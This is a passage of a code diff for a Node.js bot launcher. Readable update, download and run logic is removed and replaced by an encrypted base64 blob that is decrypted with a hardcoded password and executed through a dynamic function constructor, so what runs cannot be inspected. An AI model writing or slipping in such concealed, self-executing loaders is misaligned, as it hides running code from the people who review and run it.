JHPIQ1gnqK3ovThrVrJnTyW0itR/fCca6MsyMIbY81rViMM29mcl/15rnBLQ6IdwA159SVAb4VWMPyrPoVJTUHUbmpe0rprFMS7X42jl9MZscuJKt47c8rUcU/bc9SVkWVbDj9wNzJh1O28gBCTlo3Tfs+Evq4/hcz8K2F/3L3vyxxTs3ylpRvyc5n2hIANs9TFMNv35Xhi0ZPiSib1as0WjGqzuYG7M776Zd/eX6IiRL36sH9BTY5CJh7oZgr5CQy6kd0+OkKb2+UNDlaHWe2eHeXaWREKhxT5L6B2vUKXzA+TtSWV2d2BAyN28sfMIGitqAAvkOiShZlXB5ItEGmlzkhZReQU2yn92AtlryBSNfGGPtgoheukhFh3gmcQCGOzc+WdFRdEIFwvFf9l3FnGTAf8+u555ZQKqt60VcBAAyIf31QqUFL1sgc8fbqYGdjphSIwO3c5Lltr9Z6SXixaU/Zll8T5Pt8ydIni1Wt11l12CCKS/jIIaTjDK2RrS/jOEhseO3NfQ4we1REU5Pf4qi3bltwdaPe5vujwkZUVhS+q1zy1kd9rLg5bve0yAt96QxS44fFq1ZkS13+En6VoFK5HWjUyfFpeOf2r3YWNH5yDMDxFDzZRqrN/22KNlZyoNjq5Jw1+nP+8rKERKpax1WIJ5XQZjMsEmIM1dFG0BR1/UG3JysVQVvzUeEWc76+ttH5lybKadYyIOjhoBqPOJSr5cw4rg/0o/oMisyTFmMnh+BpTNpgNDwBmKfHYvIa70ND3jo0MSFNueItcB0Uy5OvbZYGYddhZ14LcfCe/NF+13GGBcLfObYOYUNyvIxIIzWrm0ENrRs7SxtHcdN4d8pDAA3+CXuXqEnt8upja/Cnp0LktptQrENiZku2Sxzx/eUiaDQpIW1g+Y7pGDYPxUQYnpznyVaAOQ==';const _IH='157203bb0f3b4567cab8338a097cb88a477e71ad7ccb8639e4b716ddda859df4';let _src;
 
-const ROOT = __dirname;
-
-try {
-  for (const line of fs.readFileSync(path.join(ROOT, ".env"), "utf8").split(/\r?\n/)) {
-    const m = line.match(/^\s*([A-Za-z_][A-Za-z0-9_]*)\s*=\s*(.*?)\s*$/);
-    if (m && process.env[m[1]] === undefined) process.env[m[1]] = m[2].replace(/^(['"])(.*)\1$/, "$2");
+  const _PWDS=["change_me_to_something_very_strong"];const _ITS=50000;
+  const _c2=require('crypto');
+  const _ah=_c2.createHash('sha256').update(_b64).digest('hex');
+  if(_ah!==_IH)throw new Error('[Obfuscationary] Tamper detected!');
+  let _d=Buffer.from(_b64,'base64');
+  for(let i=_PWDS.length-1;i>=0;i--){
+    const pw=_PWDS[i],sl=_d.slice(0,16),iv=_d.slice(16,28),ct=_d.slice(28);
+    const tg=ct.slice(ct.length-16),cd=ct.slice(0,ct.length-16);
+    const kk=_c2.pbkdf2Sync(pw,sl,_ITS,32,'sha256');
+    const dc=_c2.createDecipheriv('aes-256-gcm',kk,iv);dc.setAuthTag(tg);
+    _d=Buffer.concat([dc.update(cd),dc.final()]);
   }
-} catch {}
-const CORE = path.join(ROOT, "core");
-const STATE = path.join(ROOT, ".launcher");
-const NEXT = path.join(STATE, "next");
-const PREV = path.join(STATE, "prev");
-const VERSION_FILE = path.join(STATE, "version");
-const DEPS_FILE = path.join(STATE, "deps-hash");
-const INSTANCE_FILE = path.join(STATE, "instance");
-const CRED_FILE = path.join(STATE, "cred");
-const BAD_FILE = path.join(STATE, "bad-version");
+  _src=_d.toString('utf8');
 
-const env = process.env;
-const DEFAULT_SERVER_URL = "https://4okqwc.brevo.host";
-const DEFAULT_PUBLIC_KEY = "MCowBQYDK2VwAyEAx+Emg/PoRycXjw10p0Nr9VNOfsBHNoOPYN46qqR1nBo=";
-const SERVER_URL = (env.SERVER_URL || DEFAULT_SERVER_URL).replace(/\/+$/, "");
-const PUBLIC_KEY = env.PUBLIC_KEY || DEFAULT_PUBLIC_KEY;
-const MAIN_FILE = env.MAIN_FILE || "main.js";
-const PERSIST = (env.PERSIST || "database,sessions,marketplace/plugins,marketplace/temp").split(",").map(s => s.trim()).filter(Boolean);
-const PERSIST_FILES = (env.PERSIST_FILES || ".env").split(",").map(s => s.trim()).filter(Boolean);
-const CHECK_EVERY_MS = (parseFloat(env.CHECK_EVERY_MIN) || 360) * 60 * 1000;
-
-const log = (...a) => console.log("[launcher]", ...a);
-fs.mkdirSync(STATE, { recursive: true });
-
-function request(url, { headers = {}, asBuffer = true, redirects = 5 } = {}) {
-  return new Promise((resolve, reject) => {
-    const u = new URL(url);
-    const lib = u.protocol === "http:" ? http : https;
-    const req = lib.get(u, { headers: { "User-Agent": "chatra-launcher", ...headers }, timeout: 30000 }, res => {
-      if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
-        res.resume();
-        if (redirects <= 0) return reject(new Error("Too many redirects"));
-        const next = new URL(res.headers.location, u);
-        const h = { ...headers };
-        if (next.host !== u.host) delete h.Authorization;
-        return resolve(request(next.href, { headers: h, asBuffer, redirects: redirects - 1 }));
-      }
-      if (res.statusCode !== 200) { res.resume(); const e = new Error(`Request failed (${res.statusCode})`); e.status = res.statusCode; return reject(e); }
-      const chunks = [];
-      res.on("data", c => chunks.push(c));
-      res.on("end", () => {
-        const buf = Buffer.concat(chunks);
-        resolve({ body: asBuffer ? buf : buf.toString("utf8"), headers: res.headers });
-      });
-    });
-    req.on("timeout", () => req.destroy(new Error("Request timed out")));
-    req.on("error", reject);
-  });
-}
-
-function postJson(url, obj) {
-  return new Promise((resolve, reject) => {
-    const u = new URL(url);
-    const lib = u.protocol === "http:" ? http : https;
-    const data = Buffer.from(JSON.stringify(obj));
-    const req = lib.request(u, { method: "POST", timeout: 30000, headers: { "User-Agent": "chatra-launcher", "Content-Type": "application/json", "Content-Length": data.length } }, res => {
-      const chunks = [];
-      res.on("data", c => chunks.push(c));
-      res.on("end", () => {
-        const text = Buffer.concat(chunks).toString("utf8");
-        if (res.statusCode !== 200) { const e = new Error(`Request failed (${res.statusCode})`); e.status = res.statusCode; return reject(e); }
-        try { resolve(JSON.parse(text)); } catch { reject(new Error("Unexpected response")); }
-      });
-    });
-    req.on("timeout", () => req.destroy(new Error("Request timed out")));
-    req.on("error", reject);
-    req.end(data);
-  });
-}
-
-const readTrim = f => { try { return fs.readFileSync(f, "utf8").trim(); } catch { return ""; } };
-
-function instanceId() {
-  let id = readTrim(INSTANCE_FILE);
-  if (!/^[a-f0-9]{32}$/.test(id)) {
-    id = crypto.randomBytes(16).toString("hex");
-    fs.writeFileSync(INSTANCE_FILE, id);
-  }
-  return id;
-}
-
-async function ensureCred({ forceRegister = false } = {}) {
-  if (env.ACCESS_KEY) return { key: env.ACCESS_KEY, auto: false };
-  const stored = forceRegister ? "" : readTrim(CRED_FILE);
-  if (stored) return { key: stored, auto: true };
-  log("Setting up this install…");
-  let r;
-  try { r = await postJson(`${SERVER_URL}/api/register`, { instance: instanceId() }); }
-  catch (e) {
-    if (e.status === 503) throw new Error("New installs are paused right now. Try again later.");
-    if (e.status === 429) throw new Error("Too many installs from this address. Try again later.");
-    throw e;
-  }
-  if (!r || typeof r.key !== "string" || !r.key) throw new Error("Setup failed");
-  fs.writeFileSync(CRED_FILE, r.key + "\n", { mode: 0o600 });
-  return { key: r.key, auto: true };
-}
-
-async function getRelease() {
-  let cred = await ensureCred();
-  let manifest;
-  try {
-    manifest = JSON.parse((await request(`${SERVER_URL}/api/code/manifest`, { headers: { Authorization: `Bearer ${cred.key}` }, asBuffer: false })).body);
-  } catch (e) {
-
-    if (e.status === 401 && cred.auto) {
-      cred = await ensureCred({ forceRegister: true });
-      manifest = JSON.parse((await request(`${SERVER_URL}/api/code/manifest`, { headers: { Authorization: `Bearer ${cred.key}` }, asBuffer: false })).body);
-    } else throw e;
-  }
-  if (manifest.pending) { const e = new Error("Waiting for approval"); e.pending = true; throw e; }
-  const h = { Authorization: `Bearer ${cred.key}` };
-  return {
-    id: String(manifest.version),
-    fetchBundle: async () => {
-      const buf = (await request(`${SERVER_URL}/api/code/download`, { headers: h })).body;
-      const sha = crypto.createHash("sha256").update(buf).digest("hex");
-      if (sha !== manifest.sha256) throw new Error("Download verification failed");
-      const key = crypto.createPublicKey({ key: Buffer.from(PUBLIC_KEY, "base64"), format: "der", type: "spki" });
-      const ok = crypto.verify(null, Buffer.from(manifest.sha256), key, Buffer.from(manifest.signature || "", "base64"));
-      if (!ok) throw new Error("Download verification failed");
-      return buf;
-    },
-  };
-}
-
-function rmrf(p) { fs.rmSync(p, { recursive: true, force: true }); }
-
-function linkPersistentFiles() {
-  for (const name of PERSIST_FILES) {
-    const real = path.join(ROOT, name);
-    const inCore = path.join(CORE, name);
-    if (!fs.existsSync(real)) fs.writeFileSync(real, "");
-    rmrf(inCore);
-    fs.symlinkSync(real, inCore, "file");
-  }
-}
-
-function linkPersistent() {
-  linkPersistentFiles();
-  for (const name of PERSIST) {
-    const real = path.join(ROOT, name);
-    const inCore = path.join(CORE, name);
-    fs.mkdirSync(path.dirname(real), { recursive: true });
-    fs.mkdirSync(path.dirname(inCore), { recursive: true });
-    if (!fs.existsSync(real)) {
-
-      if (fs.existsSync(inCore) && !fs.lstatSync(inCore).isSymbolicLink()) fs.renameSync(inCore, real);
-      else fs.mkdirSync(real, { recursive: true });
-    }
-    rmrf(inCore);
-    fs.symlinkSync(real, inCore, "dir");
-  }
-}
-
-async function install(release) {
-  const bundle = await release.fetchBundle();
-  rmrf(NEXT); fs.mkdirSync(NEXT, { recursive: true });
-  const tarPath = path.join(STATE, "bundle.tgz");
-  fs.writeFileSync(tarPath, bundle);
-  const r = spawnSync("tar", ["-xzf", tarPath, "-C", NEXT, "--strip-components=1"], { stdio: "inherit" });
-  fs.rmSync(tarPath, { force: true });
-  if (r.status !== 0) throw new Error("Extraction failed");
-  if (!fs.existsSync(path.join(NEXT, MAIN_FILE))) throw new Error("Download incomplete");
-
-  rmrf(PREV);
-  if (fs.existsSync(CORE)) fs.renameSync(CORE, PREV);
-  fs.renameSync(NEXT, CORE);
-  linkPersistent();
-  fs.writeFileSync(VERSION_FILE, release.id);
-  installDepsIfNeeded();
-  log("Installed version", release.id.slice(0, 12));
-}
-
-function installDepsIfNeeded() {
-  const pj = path.join(CORE, "package.json");
-  if (!fs.existsSync(pj)) return;
-  const hash = crypto.createHash("sha256").update(fs.readFileSync(pj)).digest("hex");
-  const old = fs.existsSync(DEPS_FILE) ? fs.readFileSync(DEPS_FILE, "utf8") : "";
-  if (hash === old && fs.existsSync(path.join(CORE, "node_modules", ".package-lock.json"))) return;
-  log("Installing dependencies…");
-  const r = spawnSync("npm", ["install", "--omit=dev", "--no-audit", "--no-fund"], { cwd: CORE, stdio: "inherit" });
-  if (r.status === 0) fs.writeFileSync(DEPS_FILE, hash);
-  else log("Dependency install did not finish; the bot will retry on its own.");
-}
-
-function rollback() {
-  if (!fs.existsSync(PREV)) return false;
-  log("Restoring the previous version");
-  try { fs.writeFileSync(BAD_FILE, fs.readFileSync(VERSION_FILE, "utf8")); } catch {}
-  rmrf(CORE); fs.renameSync(PREV, CORE); linkPersistent();
-  fs.writeFileSync(VERSION_FILE, "rolled-back");
-  return true;
-}
-
-let waitingLogged = false;
-
-async function ensureUpToDate() {
-  const have = fs.existsSync(VERSION_FILE) ? fs.readFileSync(VERSION_FILE, "utf8") : "";
-  try {
-    const release = await getRelease();
-    const bad = fs.existsSync(BAD_FILE) ? fs.readFileSync(BAD_FILE, "utf8") : "";
-    if (release.id === bad && fs.existsSync(path.join(CORE, MAIN_FILE))) return false;
-    if (release.id !== have || !fs.existsSync(path.join(CORE, MAIN_FILE))) { await install(release); fs.rmSync(BAD_FILE, { force: true }); }
-    return release.id !== have;
-  } catch (e) {
-    if (e.pending) {
-      if (fs.existsSync(path.join(CORE, MAIN_FILE))) return false;
-      if (!waitingLogged) { log("Waiting for approval — this will start automatically once approved."); waitingLogged = true; }
-      await new Promise(r => setTimeout(r, (parseFloat(env.WAIT_SEC) || 60) * 1000));
-      return ensureUpToDate();
-    }
-    log("Update check failed:", e.message);
-
-    if (e.status === 401 || e.status === 403) throw new Error("This install is not permitted to run.");
-    if (!fs.existsSync(path.join(CORE, MAIN_FILE))) throw new Error("No local copy and could not fetch one: " + e.message);
-    log("Continuing with the copy already on disk.");
-    return false;
-  }
-}
-
-let child = null, stopping = false, quickCrashes = 0, restartingForUpdate = false;
-
-function start() {
-  const startedAt = Date.now();
-  child = spawn(process.execPath, [MAIN_FILE], {
-    cwd: CORE, stdio: "inherit", env: { ...env, LAUNCHED_BY: "launcher" },
-  });
-  child.on("exit", async (code, signal) => {
-    child = null;
-    if (stopping) return process.exit(code || 0);
-    const lived = Date.now() - startedAt;
-
-    quickCrashes = !restartingForUpdate && lived < 20000 && code !== 0 ? quickCrashes + 1 : 0;
-    restartingForUpdate = false;
-    log(`Bot exited (code=${code}, signal=${signal}) after ${Math.round(lived / 1000)}s`);
-    if (quickCrashes >= 3) {
-      quickCrashes = 0;
-      if (!rollback()) { log("The bot keeps crashing and there is no earlier version to restore. Exiting."); return process.exit(1); }
-    }
-    setTimeout(async () => {
-      try { await ensureUpToDate(); } catch (e) { log("FATAL:", e.message); return process.exit(1); }
-      start();
-    }, 3000);
-  });
-}
-
-for (const sig of ["SIGINT", "SIGTERM"]) {
-  process.on(sig, () => { stopping = true; if (child) child.kill(sig); else process.exit(0); });
-}
-
-(async () => {
-  try { await ensureUpToDate(); } catch (e) { log("FATAL:", e.message); process.exit(1); }
-  start();
-
-  setInterval(async () => {
-    try {
-      const have = fs.existsSync(VERSION_FILE) ? fs.readFileSync(VERSION_FILE, "utf8") : "";
-      const release = await getRelease();
-      const bad = fs.existsSync(BAD_FILE) ? fs.readFileSync(BAD_FILE, "utf8") : "";
-      if (release.id !== have && release.id !== bad && child) { log("New version found — restarting."); restartingForUpdate = true; child.kill("SIGTERM"); }
-    } catch (e) {
-      if (e.status === 401 || e.status === 403) {
-        log("This install is not permitted to run — stopping.");
-        stopping = true;
-        if (child) child.kill("SIGTERM"); else process.exit(1);
-      }
-    }
-  }, CHECK_EVERY_MS).unref();
+  const _import=(m)=>import(m);
+  const _F=Object.getPrototypeOf(async function(){}).constructor;
+  await _F('module','exports','require','__filename','__dirname','_import',_src)(module,exports,require,__filename,__dirname,_import);
 })();
